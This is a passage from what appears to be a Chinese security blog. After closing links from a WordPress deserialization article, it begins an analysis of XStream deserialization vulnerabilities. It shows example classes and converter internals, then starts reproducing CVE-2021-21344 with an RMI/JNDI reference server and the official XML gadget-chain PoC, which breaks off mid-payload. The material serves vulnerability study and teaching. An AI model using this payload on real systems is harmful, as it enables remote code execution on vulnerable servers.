<p><a href="http://www.bmth666.cn/2023/11/03/WordPress%EF%BC%9C6-3-2-toString-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/">WordPress＜6.3.2 __toString 反序列化链分析 | Bmth’s blog (bmth666.cn)</a></p>
<p><a href="https://exp10it.io/2023/10/wordpress-core-rce-gadget-%E5%88%86%E6%9E%90/">WordPress Core RCE Gadget 分析 - X1r0z Blog (exp10it.io)</a></p>
<p>[WordPress &lt; 3.6.1 PHP 对象注入漏洞 - 五道口杀气 (wooyun.js.org)](<a href="https://wooyun.js.org/drops/WordPress">https://wooyun.js.org/drops/WordPress</a> . 3.6.1 PHP 对象注入漏洞.html)</p>
<blockquote>
<p>注：本文首发于<a href="https://xz.aliyun.com/t/13616">https://xz.aliyun.com/t/13616</a></p>
</blockquote>
]]></content>
      <categories>
        <category>PHP安全</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>PHP安全</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之XStream漏洞分析与利用</title>
    <url>/2023/04/24/XStream/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>官方文档描述：</p>
<blockquote>
<p>XStream is designed to be an easy to use library. It takes its main task seriously: converting Java objects to XML, and XML to Java objects. As a result, it is possible to create an instance of XStream with the default constructor, call a method to convert an object into XML, then call another method to turn the XML back into an equivalent Java object. By design, there are few limits to the type of objects XStream can handle.</p>
<p>简单来说，XStream是一个能将Java对象和XML相互转换的Java库。</p>
</blockquote>
<p>导入Maven依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.thoughtworks.xstream<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>示例1</strong>：Java对象没有实现反序列化接口并重写readObject方法<br>Person类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Xstream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Xstream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XstreamTest1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;lucy&quot;</span>, <span class="number">22</span>);</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> xStream.toXML(person);</span><br><span class="line">        System.out.print(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Xstream.Person</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>lucy<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">age</span>&gt;</span>22<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Xstream.Person</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>示例2</strong>：Java对象继承了反序列化接口并重写了readObject方法<br>Car类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Xstream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Car</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> price;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Car</span><span class="params">(String name, <span class="type">int</span> price)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getPrice</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPrice</span><span class="params">(<span class="type">int</span> price)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;Print Car&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Xstream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XstreamTest2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Car</span> <span class="variable">car</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Car</span>(<span class="string">&quot;benchi&quot;</span>, <span class="number">2000000</span>);</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> xStream.toXML(car);</span><br><span class="line">        System.out.print(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Xstream.Car</span> <span class="attr">serialization</span>=<span class="string">&quot;custom&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Xstream.Car</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">price</span>&gt;</span>2000000<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>benchi<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Xstream.Car</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Xstream.Car</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>结论：Xstream在处理继承了Serializable与没有继承Serializable接口的类时，所用的方法不一致</p>
<p><strong>示例3</strong>：反序列化示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Xstream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XstreamTest2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;Xstream.Car serialization=\&quot;custom\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;Xstream.Car&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;price&gt;2000000&lt;/price&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;name&gt;benchi&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;/Xstream.Car&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/Xstream.Car&gt;&quot;</span>;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">Car</span> <span class="variable">car</span> <span class="operator">=</span> (Car) xStream.fromXML(xml);</span><br><span class="line">        System.out.println(car);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Print Car</span><br><span class="line">Xstream.Car@35d176f7</span><br></pre></td></tr></table></figure>

<p>注：在反序列化中，Car必须要有无参数的构造方法</p>
<h1 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h1><p>在Car类重写的readObject函数上下断点，看XStream的fromXML过程是否会反序列化调用重写的readObject函数<br>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">readObject:<span class="number">37</span>, Car (Xstream)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">callReadObject:<span class="number">113</span>, SerializationMethodInvoker (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">doUnmarshal:<span class="number">425</span>, SerializableConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:<span class="number">234</span>, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:<span class="number">72</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:<span class="number">65</span>, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">66</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">50</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:<span class="number">134</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">32</span>, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">1058</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:<span class="number">1042</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:<span class="number">913</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:<span class="number">904</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:<span class="number">23</span>, XstreamTest2 (Xstream)</span><br></pre></td></tr></table></figure>

<p>结论是如果目标对象实现了readObject函数的话，最终会调用此函数</p>
<p>在com.thoughtworks.xstream.core的convertAnother函数中，会调用lookupConverterForType函数根据type选择正确的converter</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">convertAnother</span><span class="params">(Object parent, Class type, Converter converter)</span> &#123;</span><br><span class="line">    type = mapper.defaultImplementationOf(type);</span><br><span class="line">    <span class="keyword">if</span> (converter == <span class="literal">null</span>) &#123;</span><br><span class="line">        converter = converterLookup.lookupConverterForType(type);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!converter.canConvert(type)) &#123;</span><br><span class="line">            <span class="type">ConversionException</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConversionException</span>(</span><br><span class="line">                <span class="string">&quot;Explicit selected converter cannot handle type&quot;</span>);</span><br><span class="line">            e.add(<span class="string">&quot;item-type&quot;</span>, type.getName());</span><br><span class="line">            e.add(<span class="string">&quot;converter-type&quot;</span>, converter.getClass().getName());</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> convert(parent, type, converter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在执行到com&#x2F;thoughtworks&#x2F;xstream&#x2F;core&#x2F;DefaultConverterLookup.java的lookupConverterForType函数时，会根据type选择converter</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Converter <span class="title function_">lookupConverterForType</span><span class="params">(Class type)</span> &#123;</span><br><span class="line">    <span class="type">Converter</span> <span class="variable">cachedConverter</span> <span class="operator">=</span> (Converter) typeToConverterMap.get(type);</span><br><span class="line">    <span class="keyword">if</span> (cachedConverter != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> cachedConverter;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> converters.iterator();</span><br><span class="line">    <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">        <span class="type">Converter</span> <span class="variable">converter</span> <span class="operator">=</span> (Converter) iterator.next();</span><br><span class="line">        <span class="keyword">if</span> (converter.canConvert(type)) &#123;</span><br><span class="line">            typeToConverterMap.put(type, converter);</span><br><span class="line">            <span class="keyword">return</span> converter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConversionException</span>(<span class="string">&quot;No converter specified for &quot;</span> + type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>iterator中总共有57个，逐个匹配<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230718154510.png"><br>这里的converter是SerializableConverter<br>在试试如果目标对象没有实现readObject函数，在fromXML过程中会发生什么？<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230718153716.png"><br>同样在经过lookupConverterForType函数后，其converter是ReflectionConverter</p>
<p><strong>总结</strong><br>总而言之，XStream为Java常见的类型提供了不同的转换器，其思路就是通过不同的converter来处理序列化数据中不同类型的数据</p>
<h1 id="漏洞汇总"><a href="#漏洞汇总" class="headerlink" title="漏洞汇总"></a>漏洞汇总</h1><p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230718160733.png"><br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230718160815.png"><br>参考：<a href="https://x-stream.github.io/security.html">https://x-stream.github.io/security.html</a></p>
<h1 id="CVE-2021-21344"><a href="#CVE-2021-21344" class="headerlink" title="CVE-2021-21344"></a>CVE-2021-21344</h1><p><strong>影响版本</strong>：&lt;&#x3D;1.4.15<br><strong>测试环境</strong>：XStream1.4.15   jdk1.8_66<br><strong>复现</strong>：<br>继续使用JNDI中用到的RMI Server：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReferServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建Reference对象</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;http://127.0.0.1:8080/&quot;</span>);</span><br><span class="line">        <span class="comment">// 由于Reference类没有继承Remote接口, 所以需要使用ReferenceWrapper进行封装</span></span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;exec&quot;</span>, wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>test是一个恶意类，在其对应的文件夹开启web服务<br>POC：官方给出的POC，需要修改其里面的RMI地址</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">name</span>&gt;</span>getDatabaseMetaData<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://localhost:7777/exec<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span 